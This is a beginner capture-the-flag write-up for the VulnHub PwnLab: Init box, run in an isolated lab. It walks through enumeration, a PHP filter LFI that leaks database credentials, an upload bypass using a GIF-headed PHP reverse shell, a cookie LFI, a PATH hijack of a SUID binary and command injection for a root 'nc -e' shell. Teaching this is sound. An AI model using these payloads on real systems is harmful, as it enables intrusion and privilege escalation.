# PWN_LAB INIT

**Difficulty**: Beginner/Intermediate

**Link**: https://www.vulnhub.com/entry/pwnlab-init,158/

**Description**: A relatively lengthy beginner friendly box.  PHP Web exploitation with some linux privilege escalation basics.

**Goal**: Gain root access and read the flag at /root/flag.txt



## Setup:

I will be detailing the setup for this challenge and how to safely configure a pentesting lab environment using VMware player.  It is important to keep these images away from the internet because they are vulnerable and to mitigate that risk its best to keep them on their own private network.

### Importing

Importing any of these vulnerable VMs into VMware is very easy.

> File -> Open
>
> Select the VMX, OVF, or OVA file
>
> Import into VMware

Our pentesting lab consists of our pentesting machine (ParrotOS) and our pentesting target (init), we will configure the virtual network to consist only of these two machines, with no internet connectivity. 

### Virtual Network

By default VMware has a host only private network assigned to the custom VMnet1.  Our setup will have the host on its own Host-Only network, and then the vulnerable VM attached to VMnet1 and connected to our host.

> ParrotOS: VM -> Settings -> Network Adapter -> Host Only
>
> VulnerableVM: VM -> Settings -> Network Adapter -> Custom -> VMnet1 (Host-Only)

## writeup:

This writeup will provide a very detailed step-by-step solution to this challenge from start to finish.  There will be no prior knowledge assumed, and every step will be explained to help anyone reading this begin to formulate their own approach to pentesting.

### Enumeration:

The first step we need to accomplish is enumerating the environment and gaining as much information as we can about the target.  To do this we first need to know what network our pentesting box is on.

```bash
ifconfig
```

ifconfig will give us the information about all of our network interfaces that we have initialized. 

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\pb0x_ova\ifconfig.png)

We know that our box is at `192.168.80.129` and the default subnet range for VMware VMnet1 is `192.168.80.0/24`.  Using this we can now locate the address of the vulnerable VM.

```bash a
nmap -sn 192.168.80.0/24
```

This NMAP command will perform a ping scan (host-discovery) for every address located in the range of `192.168.80.0/24` or in regular notation `192.168.80.0 - 192.168.80.255`

![](C:\Users\mcAnderson\AppData\Roaming\Typora\typora-user-images\1562942663799.png?style=center) 

We can see that there were 3 hosts discovered on the network: Our default gateway at `192.168.80.1`, our pentesting box at `192.168.80.129`, and an unknown host at `192.168.80.131` which is our vulnerable VM.  With the address of our target discovered, we can enumerate further and find information about the running services and open ports of the target machine.

```bash nmap
nmap -sS -sV -p- -T4 192.168.80.131
```

> sS  = SYN Scan
>
> sV  = Service Version
>
> -p- = All ports (1-65535)
>
> T4  = Quick Scan
>
> 192.168.80.131 is our target

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\nmap.png)

This scan reveals the following information about the target address:

> 80/tcp	   open	http		 Apache 2.4.10
>
> 111/tcp     open	rpcbind  2-4
>
> 3306/tcp   open    MySQL   5.5.47
>
> 49499/tcp open	status	 1

The two most important details here are that there is a running Apache Webserver on port 80, and a running MySQL server on port 3306.  Since there is a webserver running on port 80 we can navigate there using any web browser to find out more information.

### Webservice Exploitation

The application interface is very simple, there are three links: Home, Login, and Upload.  We currently have access to the Home and the Login page, but the Upload page is locked behind account authentication.

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\pwnlab.png)

Before we begin attempting various exploits (SQL Injection, XSS, etc.) it is always important to enumerate more before you begin custom exploitation.  To gain more information on this web service we will utilize two tools: Nikto, and Dirbuster.

#### Dirbuster

Dirbuster is an important tool to run during the initial discovery of a web service.  Dirbuster will validate the existence of filepaths and directories located on the web server using brute force.  Because it uses brute force, it is important to make sure that the target does not have any sort of IPS/IDS because we will be making a lot of requests to the server.  We start dirbuster by simply passing the target webservice as a parameter, and clicking run.

> http://192.168.80.131:80 for our target

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\dirbuster.png)

As shown above, dirbuster is detecting the existence of paths on the server via GET requests, and will take a while.  In the meantime we can enumerate further with another tool, Nikto.

#### Nikto

Nikto is a web vulnerability scanner designed to point out glaringly obvious vulnerabilities on the website before any manual digging has to be done.  It is an automated script and can be run in the background while other tasks are completed.

```bash
nikto -h 192.168.80.131
```

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\nikto.png)

Nikto discovers some interesting details about the site, namely the `config.php` file on the server, as well as an `/images/` directory.  Navigating to the `/images/` directory reveals the background image for the site, and attempting to navigate to the `config.php` file reveals no access permitted.

#### Exploiting the File Path

After a couple of SQL Injection, and XSS attempts that didn't go anywhere, simply looking at the URL when navigating around seemed to hint at some Local File Inclusion exploits.  The server page direction is handled by a URL parameter `page` that is passed the value of a page to direct to, and then is most likely included on the web server using `include()`.  We know there is a file named `config.php` that we don't have access to, but maybe we can exploit this LFI to include it on the web page. 

##### Simple File Inclusion:

This doesn't reveal any information, just the default page which is most likely a redirect for if a page does not exist on the web server.

> http://192.168.80.131/?page=config

##### Null Character File Endings:

If the webserver is attempting to add a file extension to the end of the the URL parameter that we don't want, we can attempt to force our own extension by including null characters in the query.

```PHP
$file = $_GET['page'];
include($file . ".txt");
```

For example the code above will take the parameter requested append `.txt` to it, and then include it on the webpage, but if we want the server to add for example `config.php` it will then attempt to include `config.php.txt` which obviously doesn't exist.  So we can add a Null Character to stop PHP from reading the last part of the file extension `config.php%00.txt` will evaluate to `config.php` on older versions of PHP.

> http://192.168.80.131/?page=config.php%00

##### PHP Execution Filters:

If the file that is being requested is added to the page with an `include()` statement instead of a `require()` statement we may need to bypass PHP execution.  In the `include()` statement, if the file is a PHP file, or some other form of source code file, PHP will attempt to include the source code onto the web page, and evaluate it instead of just printing out the source code.  We can get around this by encoding the file using PHPs built in Base64 encoding filter to trick the server into thinking that the file is not source code.

> http://192.168.80.131/?page=php://filter/convert.base64-encode/resource=config.php

That didn't work either, but the server may be attempting to append file extensions to the file, so we can attempt to bypass this again with the Null Character file endings... which doesn't work either.  Maybe the server is appending PHP to the file anyway, and we simply just need to pass it the name of the PHP file.

> http://192.168.80.131/?page=php://filter/convert.base64-encode/resource=config

###### Success!

As we can see, the server took the `config.php` file, encoded the source into Base64, and then wasn't able to interpret it as code, so instead it includes the base64 text onto the webpage.

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\phpfilterbypass.png)

We can pull down this file and decode it from Base64 to source code using Linux built-ins `cUrl`, and `base64`.

```Bash curl
curl -s http://192.168.80.131/?page=php://filter/convert.base64-encode/resource=config
```

then copy the resulting base64 encoded text and run the following

```bash base54
echo YOUR_COPIED_BASE_64_TEXT | base64 -d > filename.php
```

We can now write a small script to use this exploit and pull down the source code for all of the PHP files that we discovered previously using Dirbuster.

```Bash phpscript
FILES=('index' 'login' 'upload' 'config')
for paste_option in "${FILES[@]}"; do
	echo page=$paste_option successfully pulled
	curl -s http://192.168.80.131/?page=php://filter/convert.base64-encode/resource="$paste_option" > $paste_option.out
done
```

The result of this is the source code for all of the files that we pulled down, pictured below is the source for the `config.php` file.  

> <?php
>
> $server = "localhost";
>
> $username = "root";
>
> $password = "H4u%QJ_H99";
>
> $database = "Users";
>
> ?>

This appears to be the login credentials for the MySQL database running on port 3306, obviously now we can login to the MySQL database that is running.

```Bash mysql
mysql -u root -p -h 192.168.80.131 Users
```

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\mysqldb.png)

Logging into the Users table as specified in the retrieved `config.php` file lets us have full access to the database, and we can print out all the details of the users.

```SQL users
SELECT * FROM Users;
```

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\users.png)

Gives us the Usernames, and Base64 encoded passwords of all of the users in the database.  We can now presumably use these details to login to the `Login.php` service running on the web server.  But first we need to decode the passwords, and this can be done in the same way as before.

```Bash base64decode
echo Sld6WHVCSkp0eQ== | base64 -d > kent_pass.txt
```

Using the login details from above, we can login to the web service as any of the users in the table, but Kent is already in my clipboard so we'll use him.

#### Upload Service Exploitation

Navigating the the Upload page after logging in reveals a very simple uploading form, provide a file, and upload to the server.  After attempting to upload a simple reverse shell PHP file, we are introduced to an error `Not allowed extension, please upload images only.`  So there are most likely some file checks going on behind the scenes, luckily, from before we have the source code for this file.

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\badext.png)

Opening the source code to `upload.php` reveals the following code:

```Bash paste later

```

We can see some of the snippets that were preventing us access from before:

```PHP Access
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
```

but most importantly we can find the checks performed on the uploaded file to the server.  

##### Check One:

The first check is the check that prevented us access initially, it checks to see if the file extension is in the allowed whitelist.

```PHP check_1
$whitelist = array(".jpg", ".jpeg", ".gif", ".png");
$file_ext  = strrchr($filename, '.') 
if (!(in_array($file_ext, $whiteList))) {
    die('Not allowed extension, please upload images only')
}
```

The uploaded image's file extension is chopped off using `strrchr()` which will take the delimiter passed, in this case `'.'` and return all of the text after the last occurrence of the delimiter. 

```PHP 
strrchr("reverse_shell.php". ".") --> "php"
```

##### Check Two:

The second check performs a PHP strict evaluation to determine if the returned value from `filetype()` is `'image'`.

```PHP 
if(strpos($filetype, 'image') === false) {
    die('Error 001');
}
```

##### Check Three:

The third check runs the image through the PHP built-in `getimagesize()` which returns the image size, but most importantly returns the image type through the parameter `MIME`.

```PHP 
if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg'...) {
	die('Error 002');
}
```

##### Check Four:

The fourth and final check run makes sure that there isn't extra content in the HTML-Content header.

```PHP
if(substr_count($filetype, '/')>1){
    die('Error 003');
}
```

Knowing every check that the server runs through to determine the validity of an image, we can exploit these simple PHP functions to allow us to upload any arbitrary file to the server.   To start lets create our file that we want to upload, in this case its a simple reverse PHP shell that will give us access to the server.

```PHP revshell
<?php
	exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.80.129/1234 0>&1'");
?>
```

If ran, this will start a remote shell connection to the specified IP on the specified port.  To utilize this we must start listening on this port for the connection, which we can do using netcat.

```Bash
nc -lvnp 1234
 - l = listen
 - v = verbose
 - n = numeric IP only
 - p = specified port (1234)
```

Now that we've started listening, and we have our base file, we can start editing the file to bypass these checks.  To get past the first check is simple, we simply can change the file extension from php to any of the allowed extensions, in our case we'll use gif.

```Bash
mv shell.php shell.gif
```

The second and third checks we can get around by modifying and spoofing the file signature of the file.  This can be done in two ways, there are Kali/Parrot built-ins to hide/mask files inside images, or for this simple check we can just edit the file signature our self.

```bash
GIF87a
<?php
	exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.80.129/1234 0>&1'");
?>
```

Just by adding GIF87a to the top of our file, when the server checks using `getimagesize()` and the file type from the HTTP request, it will be interpreted as a gif.  This is because adding `GIF87a` to the top of our file changes the first 6 bytes to match the GIF file signature.

> 47 49 46 38 37 61

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\signature.png)

We should now be able to upload the malicious GIF file to the server, and then use the previously exploited LFI to include the PHP code and spawn our reverse shell.   However, as previously learned, we won't be able to call our file using the LFI exploit unless it ends in PHP, and the server strictly disallows anything but the whitelisted extensions.  We might be able to get around this by editing the request headers to trick it into thinking that the extension is a GIF, when we're really uploading a file named `shell.php`.

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\post.png)

The file we are actually uploading in this scenario is `shell.php`, however we intercepted the POST request using Burp, and edited the filename field to `shell.gif` and the Content-Type field to `image/gif`.  Using this, we are able to upload a file named `shell.php` to the web server, and potentially call it using the previous LFI exploit.   However, a couple of things are standing in our way, when we upload the file to the server, there is another line of code in the `upload.php` file that prevents us from invoking this file.

```PHP hash
$uploaddir = 'upload/';
$uploadFile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;
```

No matter what we make our extension, whether legitimate, or modified via the POST request, it will always append the extension after the last period to the end of the file.  Another important bit here is that it is not uploading our image with the direct file-name, but instead is hashing the filename with MD5.  So even if the extension wasn't changed, our original LFI exploit with `/resource=shell` wouldn't work because of the hashed filename.  However since we know the directory where the images are being sent, we can navigate there using the web browser to see the hashed filenames that we've uploaded, and as we can see the most recent file will be our `shell.php.gif` file.

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\uploadimages.png)

So we need to find another way to invoke this file, or even another completely new exploit, sometimes in pentesting you need to turn around and drop all of the work because it just won't work.  Luckily this isn't the case for this, there is another LFI exploit that we missed, which we can see by looking at the source code for the `index.php` page.

```bash index
<?php
if (isset($_COOKIE['lang'])) {
	include("lang/".$_COOKIE['lang']);
}
<html>
.
.
<?php
if (isset($_GET['page'])) {
	include($_GET['page'].".php");
} else {
	echo "Use this server to upload and share image files inside the intranet";
}
```

We'll start with the second snippet of code.. this is the LFI exploit that we have been previously exploiting to read the source code for the website.  As you can see, it is using PHP `include()` to dump the file onto the webpage, and no matter the value passed to the parameter, it will append a PHP extension.  So we cannot use this to call our `HASHSHELL.gif` file in the upload directory.   However, the first snippet reveals an even more exploitable PHP LFI, but this time using a COOKIE injection.  The LFI is the exact same but instead of using the `page` URL parameter, we will be injecting a cookie, namely `lang`, and we don't even need to worry about messing with file extensions, we can include anything, even system files.

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\revshell.png)

And success, we have spawned a reverse shell connection into the target server.  As can be seen above the terminal in the image, there is a Cookie parameter named `lang` with the value of `../upload/image_hash.gif` and now we have arbitrary RCE on the server.

## Post-Exploitation Pivoting

With a low privilege shell spawned on the webserver, we can now move onto rooting the box through privilege escalation.  After attempting various commands to gain information about the system: `whoami`, `visudo`, `su` it became clear that we were not working with a terminal, and there was no commands we could run.  After attempting to just run `bash` or `sh` with no luck, a quick google search revealed a simple python script in order to invoke a terminal process on the server, so we can check to see if the webserver has python installed

> which python
>
> /usr/bin/python

So we know we can utilize this terminal spawn trick to invoke a shell, we don't have any way to write files using a text editor, so everything will have to be done using `echo` and piping.

```Bash
echo"import pty; pty.spawn('/bin/bash')" > /tmp/shell.py && /usr/bin/python /tmp/shell.py
```

Gives us a working bash environment under the user `www-data`, and after attempting to navigate around, we find out has next to no permissions.  Maybe the same credentials for logging into the website can work here?

```bash
su kent
```

will allow us to login as the specified user, provide we have the correct password, which we do.

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\kent.png)

Navigating around with kent reveals no permissions outside the /var/www/ directories, and no files in his home directory.  So we can do the same with all of the users we know in order to try and get some higher privileges.

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\mike.png)

Attempting to login with Mike reveals that we don't have the correct credentials, so we can try the last account Kane.

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\perms.png)

* **Note:** *the `cat` and `new` files are files that were created later on, at this point in the exploit the only file that will be in this directory is `msgmike`.*

Kane still has the same permissions as Kent, but he has an interesting file in his home directory `msgmike` which is owned by Mike.  We can learn a little bit more about this particular file by running the `file` command, which will tell us exactly what is contained in the file.

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\filemsgmike.png)

As we can see from the output, it is a 32-bit LSB executable, and most importantly the SETUID bit is set, below is an excerpt from the manpage entry for SETUID.

> **setuid**() sets the effective user ID of the calling process. If the effective UID of the caller is root, the real UID and saved set-user-ID are also set.

What this means is that no matter what user runs this program, all of the functions and commands inside the program will be run under the permissions of the owner (Mike).   This sounds terribly insecure, but as long as the functions and commands in this program are safe from exploits (Overflow, Command Injection, etc.) the SETUID function is very safe.  To find out more about what this program does we can attempt to run it.

```Bash
./msgmike
```

> cat: /home/mike/msg.txt: No such file or directory

It seems to just be a program to display the contents of the message in Mike's directory, we can find even more information about it by displaying the contents.  We can do this by using the `strings` command which will display all "human readable" strings that are contained within the file.

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\stringsmsgmike.png)

* **Note**: Because this file is an executable, the output of the commands are garbled, a much better way to perform executable analysis is using a debugger (IDA, GDB, R2).

We can see from the output of strings that at least one of the commands used in the program is `cat /home/mike/msg.txt`.  This doesn't seem like its directly exploitable, but what is important here is that `cat` is not being called with its absolute path.  If the user has permissions to change the `PATH` environment variable than we can change which `cat` the program invokes.  To see what the current `PATH ` variable is set at we can use the following command.

```Bash
echo $PATH
```

> /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

As we can see, if a program that isn't in the current directory is invoked, this is the listing of directories that will be searched for to find it.  On this specific system, cat isn't located until `/bin` so if we were to create an executable in Kane's home directory `(/home/kane)` then edit the `PATH` variable to look there first, we can manipulate the flow of this executable.  We can test to see if it works by first editing the `PATH` variable with the following command:

```Bash
export PATH=.:$PATH
echo $PATH
```

> .:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

A very subtle difference from before, there is a `.:` at the beginning of the file path, and in *nix `.` stands for current directory.   With the `PATH` variable changed we can now create our own executable named `cat` in the directory where `msgmike` is located.  We can start simple to make sure our `PATH` exploit works.

```BASH
echo "whoami" > /home/kane/cat
chmod +x /home/kane/cat
```

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\pathexploit.png)

As we can see from the output of running `msgmike` the `whoami` command returns Mike, this means we have arbitrary RCE as the privileged user Mike.  Now we can make something more devious, any BASH commands we wish to run we can now exploit, as long as the user Mike has the permissions to run them.

```Bash
echo "/bin/cat /root/flag.txt" > cat
```

We edit our cat executable to attempt to print the contents where the flag is, if Mike has full permissions we should be able to read the contents at `/root/flag.txt`.

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\permdenied.png)

* **Note**: In this program you must call `cat` by its absolute path `(/bin/cat)` or else we will end up exploiting ourselves by calling our own `cat` program.

It seems that Mike doesn't have the permissions we though he had, time to do a little more digging.  We can edit the `cat` program again, but this time we'll display the contents of Mike's home directory, maybe something interesting is hiding there.

```Bash
echo "ls -ltr /home/mike" > cat
```

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\mikehome.png)

This reveals a program named `msg2root` in Mike's home directory, with the SETUID bit set again, but this time the owner is `root`.  If this is the same sort of exploit, we can just chain together both `PATH` exploits to have arbitrary RCE as `root`.   Doing the same file analysis on this new binary as before reveals the solution to our previous exploit.

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\msg2rootsource.png)

In this program the command is invoked absolutely `(/bin/echo)`instead of relatively `(echo)`, meaning we can't alter which program is actually invoked.  However it appears to be reading input from `stdin` and appending` (>>)` that to the file in `/root/messages.txt`, without sanitization!  This means that we can chain together the two exploits, and pass some malicious commands to the `msg2root` executable and possible get arbitrary RCE.

```Bash
echo '$(/bin/cat /root/flag.txt)' > /home/kane/input
```

A little explanation as to what is happening, we are going to want to provide input from `stdin` to the `msg2root` executable.  This input is going to be the command to print out the contents of the flag at `/root/flag.txt`.  If we were to just call the program `msg2root` and pass it `/bin/cat /root/flag.txt` as parameters, it would just interpret that command as a string.

```bash
echo /bin/cat /root/flag.txt
```

> "/bin/cat /root/flag.txt"

However if we wish to run that command, and then print out the contents of the command we can utilize the special bash character `$`.

```BASH
echo $(/bin/cat /root/flag.txt)
```

> "whatever the contents of /root/flag.txt are"

This means that the command will be run inside the parentheses, and then the output will be passed onto the `/root/messages.txt` file, so we can read the contents of the flag using this.  With our previously created input file located at `/home/kane/input` we can pipe the contents of that file into the `msg2root` program, and obtain RCE

```BASH
echo '/home/mike/./msg2root < /home/kane/input' > cat
./msgmike
```

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\completed.png)

We have successfully achieved RCE as root, but that is not the goal of rooting a box, we want to be root with a shell that we can manipulate.  To do this we can change the contents of our `input` file to be more malicious and spawn another reverse shell for us.  We can start listening on the host machine for any connections on the port 1235

```BASH
nc -lvnp 1235
```

and then on the target machine we can manipulate the input file to instead read

```bash
$(nc -e /bin/sh 192.168.80.129 1235)
```

with our newly created payload we can once again chain our exploits together, invoke `msgmike` and achieve a remote root shell on our own host computer to fully root the box.

![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\rootred.png)

